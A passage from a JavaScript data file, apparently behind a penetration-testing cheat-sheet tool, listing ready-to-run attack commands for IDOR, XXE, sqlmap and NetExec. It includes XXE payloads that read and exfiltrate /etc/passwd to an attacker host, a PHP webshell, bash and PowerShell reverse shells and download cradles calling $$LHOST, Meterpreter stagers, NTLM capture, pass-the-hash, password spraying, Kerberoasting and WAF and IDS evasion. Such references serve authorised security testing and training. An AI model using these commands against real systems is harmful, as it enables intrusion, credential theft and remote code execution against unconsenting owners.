            { id: "idor5", label: "Vertical privilege escalation", os: "Both", command: "# Using low-priv token, request admin endpoints:\nGET /api/admin/users\nGET /api/admin/settings\nPOST /api/admin/user/delete", notes: "Replay admin requests with user-level session in Burp." }
            ]
          }
        ],
      },
      {
        id: 'web-xxe',
        name: 'XXE Injection',
        description: 'Exploit XML parsers to read local files, perform SSRF, or exfiltrate data out-of-band.',
        tags: ['web', 'xxe'],
                subtechniques: [
          {
            id: "xxe-read",
            name: "File Read & SSRF",
            commands: [
            { id: "xxe1", label: "Basic file read", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>", notes: "Replace existing XML body in Burp with this payload." },
            { id: "xxe2", label: "Windows file read", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">\n]>\n<root>&xxe;</root>", notes: "" },
            { id: "xxe3", label: "XXE to SSRF", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">\n]>\n<root>&xxe;</root>", notes: "Combine with SSRF targets to reach internal services." }
            ]
          },
          {
            id: "xxe-blind",
            name: "Blind & SVG",
            commands: [
            { id: "xxe4", label: "Blind XXE (OOB exfil)", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY % dtd SYSTEM \"http://$$LHOST/evil.dtd\">\n  %dtd;\n]>\n<root>&send;</root>\n\n# evil.dtd (serve with python3 -m http.server 80):\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % wrap \"<!ENTITY send SYSTEM 'http://$$LHOST/?x=%file;'>\">\n%wrap;", notes: "" },
            { id: "xxe5", label: "XXE in SVG upload", os: "Both", command: "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<svg xmlns=\"http://www.w3.org/2000/svg\">\n  <text>&xxe;</text>\n</svg>", notes: "Upload as .svg if the app renders SVG images server-side." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 17. sqlmap Tool ─────────────────────────────────────────────────── */
  {
    id: 'sqlmap',
    name: 'sqlmap Tool',
    icon: '🗃️',
    techniques: [
      {
        id: 'sqlmap-detect',
        name: 'Detection & Fingerprinting',
        description: 'Identify injection points and determine the database engine.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smd-inp",
            name: "Input Methods",
            commands: [
            { id: "sm_d1", label: "Basic scan (GET)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --batch", notes: "--batch auto-answers all prompts. Good starting point." },
            { id: "sm_d2", label: "Test specific parameter", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -p $$VULN_PARAM --batch", notes: "Use -p when you already know which parameter is injectable." },
            { id: "sm_d3", label: "POST data scan", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"user=admin&pass=test\" -p $$VULN_PARAM --batch", notes: "Tests parameters in the POST body." },
            { id: "sm_d4", label: "From Burp request file", os: "Linux", command: "sqlmap -r /tmp/burp.req --batch", notes: "Most reliable method. Save from Burp: right-click → Save item." }
            ]
          },
          {
            id: "smd-fp",
            name: "Fingerprint & Thoroughness",
            commands: [
            { id: "sm_d5", label: "Banner + fingerprint", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --banner --current-user --current-db --hostname --batch", notes: "Confirms injection and grabs version, current user, and active DB in one shot." },
            { id: "sm_d6", label: "Force DBMS type", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --dbms=$$DB_TYPE --batch", notes: "Skip detection. Values: mysql, mssql, postgresql, oracle, sqlite." },
            { id: "sm_d7", label: "All injection techniques", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --technique=BEUSTQ --batch", notes: "B=boolean, E=error, U=union, S=stacked, T=time, Q=OOB. Default omits Q." },
            { id: "sm_d8", label: "High thoroughness", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --level=5 --risk=3 --batch", notes: "--level 5 tests User-Agent, Referer, cookies. --risk 3 enables heavy payloads." },
            { id: "sm_d9", label: "Identify WAF", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --identify-waf --batch", notes: "Detects common WAF products before choosing bypass strategy." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-enum',
        name: 'Enumeration',
        description: 'List databases, tables, columns, users, and privileges.',
        tags: ['web', 'sqli', 'sqlmap', 'database'],
                subtechniques: [
          {
            id: "sme-db",
            name: "Database Structure",
            commands: [
            { id: "sm_e1", label: "List all databases", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --dbs --batch", notes: "" },
            { id: "sm_e2", label: "List tables", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME --tables --batch", notes: "" },
            { id: "sm_e3", label: "List columns", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --columns --batch", notes: "" },
            { id: "sm_e4", label: "Full DB schema", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME --schema --batch", notes: "All tables and column definitions. More thorough than --tables." }
            ]
          },
          {
            id: "sme-usr",
            name: "Users & Search",
            commands: [
            { id: "sm_e5", label: "List users", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --users --batch", notes: "" },
            { id: "sm_e6", label: "Password hashes", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --passwords --batch", notes: "Dumps DB auth hashes and attempts to crack them inline." },
            { id: "sm_e7", label: "User privileges", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --privileges --batch", notes: "Identifies FILE, SUPER, EXECUTE — essential for RCE planning." },
            { id: "sm_e8", label: "Count rows before dump", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --count --batch", notes: "Estimate dump size before committing to --dump." },
            { id: "sm_e9", label: "Search tables by name", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --search -T $$DB_TABLE --batch", notes: "Find tables across all accessible databases." },
            { id: "sm_e10", label: "Search columns by name", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --search -C $$DB_COLUMN --batch", notes: "Search for \"password\", \"hash\", \"token\" across all tables." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-extract',
        name: 'Data Extraction',
        description: 'Dump table data, crack hashes, and run interactive SQL queries.',
        tags: ['web', 'sqli', 'sqlmap', 'database'],
                subtechniques: [
          {
            id: "smx-dump",
            name: "Dump Data",
            commands: [
            { id: "sm_x1", label: "Dump full table", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --batch", notes: "" },
            { id: "sm_x2", label: "Dump specific columns", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE -C \"$$DB_COLUMN\" --dump --batch", notes: "Faster — only fetches the columns you need." },
            { id: "sm_x3", label: "Dump with WHERE filter", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --where=\"id=1\" --dump --batch", notes: "Target specific rows with any valid SQL WHERE clause." },
            { id: "sm_x4", label: "Paginate rows", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --start=1 --stop=50 --batch", notes: "Avoid dumping huge tables in one shot." },
            { id: "sm_x5", label: "Dump all tables in DB", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME --dump-all --batch", notes: "" },
            { id: "sm_x6", label: "Dump everything (skip sysdbs)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --dump-all --exclude-sysdbs --batch", notes: "Skips information_schema, sys, master — targets only app data." }
            ]
          },
          {
            id: "smx-out",
            name: "Output & Shell",
            commands: [
            { id: "sm_x7", label: "Save to output directory", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --output-dir=/tmp/sqlmap --batch", notes: "Results saved as CSV files for easy review." },
            { id: "sm_x8", label: "Interactive SQL shell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --sql-shell --batch", notes: "Run arbitrary SQL queries through the injection point." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-fileops',
        name: 'File Operations',
        description: 'Read and write files on the server via SQL injection.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smf-read",
            name: "Read Files",
            commands: [
            { id: "sm_f1", label: "Read /etc/passwd", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"/etc/passwd\" --batch", notes: "Requires FILE privilege (MySQL) or BULK rights (MSSQL)." },
            { id: "sm_f2", label: "Read Windows hosts", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\" --batch", notes: "" },
            { id: "sm_f3", label: "Read web.config (IIS)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"C:\\\\inetpub\\\\wwwroot\\\\web.config\" --batch", notes: "Often contains DB connection strings and app secrets." },
            { id: "sm_f4", label: "Read PHP config", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-read=\"/var/www/html/config.php\" --batch", notes: "Also try: /var/www/html/wp-config.php, ../config.php" }
            ]
          },
          {
            id: "smf-write",
            name: "Write & Check",
            commands: [
            { id: "sm_f5", label: "Write PHP webshell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-write=\"./shell.php\" --file-dest=\"/var/www/html/shell.php\" --batch", notes: "shell.php: <?php system($_GET[\"cmd\"]); ?>  Needs FILE priv + web root write access." },
            { id: "sm_f6", label: "Write ASPX webshell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --file-write=\"./shell.aspx\" --file-dest=\"C:\\\\inetpub\\\\wwwroot\\\\shell.aspx\" --batch", notes: "" },
            { id: "sm_f7", label: "Check FILE privilege", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --privileges --batch", notes: "Look for FILE in output — required for read/write on MySQL." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-osshell',
        name: 'OS Command Execution',
        description: 'Execute operating system commands through the SQL injection.',
        tags: ['web', 'sqli', 'sqlmap', 'rce'],
                subtechniques: [
          {
            id: "smo-shell",
            name: "Shell & Commands",
            commands: [
            { id: "sm_o1", label: "Interactive OS shell", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-shell --batch", notes: "Tries xp_cmdshell (MSSQL), UDF injection (MySQL), COPY FROM PROGRAM (PostgreSQL)." },
            { id: "sm_o2", label: "Single OS command", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-cmd=\"id\" --batch", notes: "Faster than --os-shell for one-off commands. Try: id, whoami, hostname." },
            { id: "sm_o3", label: "Reverse shell (Linux)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-cmd=\"bash -c 'bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1'\" --batch", notes: "Start listener: nc -lvnp $$LPORT" },
            { id: "sm_o4", label: "Reverse shell (Windows PS)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-cmd=\"powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://$$LHOST/shell.ps1')\\\"\" --batch", notes: "Host shell.ps1 via: python3 -m http.server 80" }
            ]
          },
          {
            id: "smo-adv",
            name: "Meterpreter & NTLM",
            commands: [
            { id: "sm_o5", label: "Meterpreter (os-pwn)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --os-pwn --batch", notes: "Uploads and executes a Metasploit stager. Requires msf on $$LHOST." },
            { id: "sm_o6", label: "MSSQL NTLMv2 capture", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --sql-shell\n-- In shell: EXEC master..xp_dirtree '\\\\\\\\$$LHOST\\\\share'", notes: "Triggers SMB auth to attacker. Start Responder: responder -I eth0 -wrf" }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-auth',
        name: 'Authentication Bypass',
        description: 'Test injection via cookies, tokens, custom headers, and auth schemes.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "sma-hdr",
            name: "Cookie & Header Auth",
            commands: [
            { id: "sm_a1", label: "Cookie injection", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --cookie=\"PHPSESSID=abc; id=1\" -p id --batch", notes: "" },
            { id: "sm_a2", label: "Cookie scan (auto level 2)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --cookie=\"PHPSESSID=abc\" --level=2 --batch", notes: "--level 2+ automatically tests all cookie parameters." },
            { id: "sm_a3", label: "Custom header injection", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -H \"X-Forwarded-For: 1*\" --level=3 --batch", notes: "Append * to mark the injection position in the header value." },
            { id: "sm_a4", label: "Bearer / JWT token", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -H \"Authorization: Bearer <token>*\" --batch", notes: "" }
            ]
          },
          {
            id: "sma-cred",
            name: "Credentials & CSRF",
            commands: [
            { id: "sm_a5", label: "HTTP Basic auth", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --auth-type=Basic --auth-cred=\"$$USER:$$PASSWORD\" --batch", notes: "" },
            { id: "sm_a6", label: "POST + session cookie", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"user=admin&pass=test\" --cookie=\"PHPSESSID=abc\" --batch", notes: "Combine POST body with authenticated session cookie." },
            { id: "sm_a7", label: "Auto CSRF token refresh", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"$$VULN_PARAM=test\" --csrf-token=csrf_token --csrf-url=\"$$VULN_URL\" --batch", notes: "Replace csrf_token with the actual field name." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-bypass',
        name: 'WAF & Evasion',
        description: 'Tamper scripts, encoding, and rate-limiting to evade detection.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smb-tamp",
            name: "Tamper Scripts",
            commands: [
            { id: "sm_b1", label: "space2comment", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=space2comment --batch", notes: "Replaces spaces with /**/. Bypasses WAFs blocking space in SQL keywords." },
            { id: "sm_b2", label: "between + randomcase", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=between,randomcase --batch", notes: "Good general-purpose combo — replaces > with BETWEEN, randomises casing." },
            { id: "sm_b3", label: "charunicodeencode", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=charunicodeencode --batch", notes: "Unicode-encodes chars as %u00xx. Effective against regex WAF signatures." },
            { id: "sm_b4", label: "apostrophemask + hex2char", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tamper=apostrophemask,hex2char --batch", notes: "Masks quotes and converts strings to hex — bypasses strict quote filters." }
            ]
          },
          {
            id: "smb-rate",
            name: "Rate & Routing",
            commands: [
            { id: "sm_b5", label: "Random User-Agent", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --random-agent --batch", notes: "Rotates UA per request to evade browser-fingerprint WAF rules." },
            { id: "sm_b6", label: "Route through Burp", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --proxy=http://127.0.0.1:8080 --batch", notes: "Sends all requests through Burp for inspection and modification." },
            { id: "sm_b7", label: "Tor routing", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --tor --tor-type=SOCKS5 --check-tor --batch", notes: "Requires Tor service running." },
            { id: "sm_b8", label: "Rate limit / slow scan", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --delay=2 --timeout=30 --retries=3 --batch", notes: "Adds delay to avoid rate-limit triggers and IDS alerts." },
            { id: "sm_b9", label: "List all tamper scripts", os: "Linux", command: "sqlmap --list-tampers", notes: "Full list with descriptions. Pick based on observed WAF behaviour." }
            ]
          }
        ],
      },
      {
        id: 'sqlmap-advanced',
        name: 'Advanced',
        description: 'Second-order injection, APIs, session management, and verbose debugging.',
        tags: ['web', 'sqli', 'sqlmap'],
                subtechniques: [
          {
            id: "smv-ep",
            name: "Special Endpoints",
            commands: [
            { id: "sm_v1", label: "JSON API endpoint", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data='{\"id\":1}' -H \"Content-Type: application/json\" --batch", notes: "sqlmap auto-detects JSON format." },
            { id: "sm_v2", label: "REST path parameter", os: "Linux", command: "sqlmap -u \"http://$$IP/api/users/1*\" --batch", notes: "Append * to the injectable path segment." },
            { id: "sm_v3", label: "Second-order injection", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"name=test\" --second-url=\"$$VULN_URL\" --batch", notes: "Inject at first URL; exploitation fires when second URL loads stored input." },
            { id: "sm_v4", label: "Multi-threaded dump", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -D $$DB_NAME -T $$DB_TABLE --dump --threads=10 --batch", notes: "Default threads=1. Up to 10 is safe. Faster but noisier." }
            ]
          },
          {
            id: "smv-dbg",
            name: "Session & Debugging",
            commands: [
            { id: "sm_v5", label: "Verbose (show payloads)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" -v 3 --batch", notes: "Level 3 shows all payloads. 4=HTTP requests, 5=responses." },
            { id: "sm_v6", label: "Flush session (re-test)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --flush-session --batch", notes: "Clears sqlmap result cache for this target." },
            { id: "sm_v7", label: "Save + resume scan", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --output-dir=/tmp/sqlmap --batch\n# Resume after interruption:\nsqlmap -u \"$$VULN_URL\" --output-dir=/tmp/sqlmap --resume --batch", notes: "" },
            { id: "sm_v8", label: "XML / SOAP body", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --data=\"<id>1</id>\" -H \"Content-Type: text/xml\" --batch", notes: "Use -p to specify which XML tag to fuzz." },
            { id: "sm_v9", label: "Test all headers (level 5)", os: "Linux", command: "sqlmap -u \"$$VULN_URL\" --level=5 --batch", notes: "--level 5 auto-tests User-Agent, Referer, X-Forwarded-For, and all cookies." }
            ]
          }
        ],
      },
    ],
  },

  /* ── 18. NetExec (nxc) ───────────────────────────────────────────────────── */
  {
    id: 'netexec',
    name: 'NetExec (nxc)',
    icon: '🖧',
    techniques: [
      {
        id: 'nxc-smb-enum',
        name: 'SMB — Enumeration',
        description: 'Discover hosts, shares, users, groups, and policies over SMB.',
        tags: ['smb', 'windows', 'network', 'netexec'],
                subtechniques: [
          {
            id: "nxcse-host",
            name: "Host Discovery",
            commands: [
            { id: "nxc_se1", label: "Host info (single)", os: "Linux", command: "nxc smb $$IP", notes: "Prints OS, hostname, SMB version, signing status — no creds needed." },
            { id: "nxc_se2", label: "Network sweep", os: "Linux", command: "nxc smb $$IP/24", notes: "Replace /24 with your subnet. Finds all live SMB hosts." },
            { id: "nxc_se3", label: "Null session shares", os: "Linux", command: "nxc smb $$IP -u \"\" -p \"\" --shares", notes: "Unauthenticated share listing. READ = readable, WRITE = writable." },
            { id: "nxc_se4", label: "Guest session shares", os: "Linux", command: "nxc smb $$IP -u \"guest\" -p \"\" --shares", notes: "Guest account is often enabled on older Windows hosts." },
            { id: "nxc_se5", label: "Authenticated shares", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --shares", notes: "" }
            ]
          },
          {
            id: "nxcse-usr",
            name: "User & Group Enum",
            commands: [
            { id: "nxc_se6", label: "List users (RPC)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --users", notes: "" },
            { id: "nxc_se7", label: "RID brute-force users", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --rid-brute", notes: "Resolves SIDs 500–4000. Works even with limited privileges." },
            { id: "nxc_se8", label: "List groups", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --groups", notes: "" },
            { id: "nxc_se9", label: "Password policy", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --pass-pol", notes: "Check lockout threshold before spraying." }
            ]
          },
          {
            id: "nxcse-sess",
            name: "Session & Files",
            commands: [
            { id: "nxc_se10", label: "Logged-on users", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --loggedon-users", notes: "Shows users with active desktop sessions." },
            { id: "nxc_se11", label: "Active sessions", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --sessions", notes: "SMB sessions currently connected to this host." },
            { id: "nxc_se12", label: "Spider share (file list)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -M spider_plus -o READ_ONLY=true", notes: "Recursively lists all readable files. Output saved to /tmp/nxc_spider_plus/." }
            ]
          }
        ],
      },
      {
        id: 'nxc-smb-auth',
        name: 'SMB — Authentication & PTH',
        description: 'Test credentials, pass-the-hash, and local authentication.',
        tags: ['smb', 'windows', 'credentials', 'netexec'],
                subtechniques: [
          {
            id: "nxcsa-auth",
            name: "Authentication",
            commands: [
            { id: "nxc_sa1", label: "Test single cred", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" in output = local admin." },
            { id: "nxc_sa2", label: "Test against subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -p $$PASSWORD", notes: "Tests the same cred on every live host in the subnet." },
            { id: "nxc_sa3", label: "Pass-the-Hash", os: "Linux", command: "nxc smb $$IP -u $$USER -H $$HASH", notes: "NTLM hash format: LMhash:NThash or just the 32-char NT part." },
            { id: "nxc_sa4", label: "PTH across subnet", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH", notes: "Find all machines where the hash gives admin." },
            { id: "nxc_sa5", label: "Local account auth", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --local-auth", notes: "Authenticates as local account instead of domain account." },
            { id: "nxc_sa6", label: "Local PTH", os: "Linux", command: "nxc smb $$IP -u $$USER -H $$HASH --local-auth", notes: "Useful after dumping local SAM hashes." }
            ]
          },
          {
            id: "nxcsa-spray",
            name: "Spraying & Brute",
            commands: [
            { id: "nxc_sa7", label: "Password spray (domain)", os: "Linux", command: "nxc smb $$DC -u users.txt -p $$PASSWORD --continue-on-success", notes: "One password against many users. Check --pass-pol first to avoid lockouts." },
            { id: "nxc_sa8", label: "Credential brute", os: "Linux", command: "nxc smb $$IP -u users.txt -p $$WORDLIST --continue-on-success --no-bruteforce", notes: "--no-bruteforce pairs user[n] with password[n] (1:1), not every combo." },
            { id: "nxc_sa9", label: "Hash spray", os: "Linux", command: "nxc smb $$IP/24 -u $$USER -H $$HASH --local-auth --continue-on-success", notes: "Lateral movement — find all machines reachable with the same local hash." }
            ]
          }
        ],
      },
      {
        id: 'nxc-smb-exec',
        name: 'SMB — Command Execution',
        description: 'Execute commands and transfer files over SMB.',
        tags: ['smb', 'windows', 'exec', 'netexec'],
                subtechniques: [
          {
            id: "nxcsx-exec",
            name: "Execution Methods",
            commands: [
            { id: "nxc_sx1", label: "Execute command (default)", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -x \"whoami /all\"", notes: "Default exec method is wmiexec. Requires admin." },
            { id: "nxc_sx2", label: "wmiexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method wmiexec -x \"whoami\"", notes: "Uses WMI. Leaves fewer log traces than smbexec." },
            { id: "nxc_sx3", label: "smbexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method smbexec -x \"whoami\"", notes: "Creates a service on target. Louder but works when WMI is blocked." },
            { id: "nxc_sx4", label: "atexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method atexec -x \"whoami\"", notes: "Schedules task via Task Scheduler. Good for bypassing some AV." },
            { id: "nxc_sx5", label: "mmcexec", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --exec-method mmcexec -x \"whoami\"", notes: "Uses MMC COM object. Stealthier — does not create services or WMI calls." },
            { id: "nxc_sx6", label: "PowerShell command", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -X \"Get-LocalUser\"", notes: "-X runs the command in a PowerShell process." }
            ]
          },
          {
            id: "nxcsx-file",
            name: "File Transfer & Shell",
            commands: [
            { id: "nxc_sx7", label: "Upload file", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --put-file /tmp/shell.exe \"C:\\Windows\\Temp\\shell.exe\"", notes: "" },
            { id: "nxc_sx8", label: "Download file", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD --get-file \"C:\\Windows\\Temp\\out.txt\" /tmp/out.txt", notes: "" },
            { id: "nxc_sx9", label: "Reverse shell one-liner", os: "Linux", command: "nxc smb $$IP -u $$USER -p $$PASSWORD -x \"powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://$$LHOST/shell.ps1')\\\"\"", notes: "Start listener: nc -lvnp $$LPORT — host shell.ps1 via python3 -m http.server" }
            ]
          }
        ],
      },
      {
        id: 'nxc-ldap',
        name: 'LDAP / AD Enumeration',
        description: 'Enumerate domain objects, policies, and Kerberos targets via LDAP.',
        tags: ['ldap', 'active directory', 'windows', 'netexec'],
                subtechniques: [
          {
            id: "nxcl-basic",
            name: "Basic Enumeration",
            commands: [
            { id: "nxc_l1", label: "Domain users", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --users", notes: "" },
            { id: "nxc_l2", label: "Domain groups", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --groups", notes: "" },
            { id: "nxc_l3", label: "Domain computers", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --computers", notes: "" },
            { id: "nxc_l4", label: "Get domain SID", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --get-sid", notes: "Needed for golden/silver ticket attacks." },
            { id: "nxc_l5", label: "Admin count accounts", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --admin-count", notes: "Lists accounts with adminCount=1 — high-privilege targets." }
            ]
          },
          {
            id: "nxcl-hunt",
            name: "Account Hunting",
            commands: [
            { id: "nxc_l6", label: "Password-not-required", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --password-not-required", notes: "Accounts with PASSWD_NOTREQD flag — may have empty passwords." },
            { id: "nxc_l7", label: "Users with description", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD -M get-desc-users", notes: "Descriptions often contain passwords set by admins." },
            { id: "nxc_l8", label: "Kerberoasting", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --kerberoasting hashes.txt", notes: "Dumps TGS hashes. Crack with: hashcat -m 13100 hashes.txt $$WORDLIST" },
            { id: "nxc_l9", label: "AS-REP Roasting", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --asreproast hashes.txt", notes: "Dumps AS-REP hashes. Crack with: hashcat -m 18200 hashes.txt $$WORDLIST" },
            { id: "nxc_l10", label: "GMSA passwords", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --gmsa", notes: "Reads Group Managed Service Account passwords if you have read rights." }
            ]
          },
          {
            id: "nxcl-deleg",
            name: "Delegation & BloodHound",
            commands: [
            { id: "nxc_l11", label: "Unconstrained delegation", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD --trusted-for-delegation", notes: "Lists computers/users with unconstrained delegation set." },
            { id: "nxc_l12", label: "BloodHound collection", os: "Linux", command: "nxc ldap $$DC -u $$USER -p $$PASSWORD -M bloodhound", notes: "Collects all BloodHound data and outputs .zip for import." }
            ]
          }
        ],
      },
      {
        id: 'nxc-winrm',
        name: 'WinRM',
        description: 'Test and execute commands over Windows Remote Management (port 5985/5986).',
        tags: ['winrm', 'windows', 'exec', 'netexec'],
                subtechniques: [
          {
            id: "nxcw-auth",
            name: "Auth & Execute",
            commands: [
            { id: "nxc_w1", label: "Test auth", os: "Linux", command: "nxc winrm $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = member of Remote Management Users or Administrators." },
            { id: "nxc_w2", label: "Test PTH", os: "Linux", command: "nxc winrm $$IP -u $$USER -H $$HASH", notes: "" },
            { id: "nxc_w3", label: "Execute command", os: "Linux", command: "nxc winrm $$IP -u $$USER -p $$PASSWORD -x \"whoami /all\"", notes: "" },
            { id: "nxc_w4", label: "Sweep subnet", os: "Linux", command: "nxc winrm $$IP/24 -u $$USER -p $$PASSWORD", notes: "Find all WinRM-enabled hosts in subnet." }
            ]
          },
          {
            id: "nxcw-ewrm",
            name: "evil-winrm",
            commands: [
            { id: "nxc_w5", label: "evil-winrm shell", os: "Linux", command: "evil-winrm -i $$IP -u $$USER -p $$PASSWORD", notes: "Full interactive PS shell. Install: gem install evil-winrm" },
            { id: "nxc_w6", label: "evil-winrm PTH", os: "Linux", command: "evil-winrm -i $$IP -u $$USER -H $$HASH", notes: "" }
            ]
          }
        ],
      },
      {
        id: 'nxc-mssql',
        name: 'MSSQL',
        description: 'Authenticate, query, and escalate through MSSQL via nxc.',
        tags: ['mssql', 'database', 'windows', 'netexec'],
                subtechniques: [
          {
            id: "nxcm-auth",
            name: "Auth & Enum",
            commands: [
            { id: "nxc_m1", label: "Test auth", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD", notes: "\"Pwn3d!\" = sysadmin role." },
            { id: "nxc_m2", label: "Windows auth", os: "Linux", command: "nxc mssql $$IP -u $$USER -p $$PASSWORD -d $$DOMAIN", notes: "Use -d . for local Windows auth." },
